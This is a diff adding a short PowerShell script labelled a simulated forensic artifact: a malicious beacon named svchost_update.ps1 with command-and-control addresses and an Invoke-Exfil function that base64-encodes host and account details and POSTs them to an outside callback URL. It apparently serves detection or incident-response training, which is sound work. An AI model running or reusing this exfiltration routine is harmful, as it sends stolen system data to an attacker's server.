@@ -1,0 +1,14 @@
+# SIMULATED FORENSIC ARTIFACT - MALICIOUS POWERSHELL BEACON
+# Identified in %TEMP%\svchost_update.ps1
+$C2_IP = "198.51.100.45"
+$C2_Domain = "c2-stealth-update.net"
+$Callback_URL = "https://data-drop.malicious-domain.org/collect"
+$TargetHash = "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"
+
+function Invoke-Exfil {
+    param([string]$Data)
+    $EncData = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($Data))
+    Invoke-WebRequest -Uri "$Callback_URL" -Method Post -Body $EncData -UserAgent "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+}
+
+Invoke-Exfil -Data "HOST: FINANCE-DB01 | USER: svc_backup | IP: 10.0.4.12"
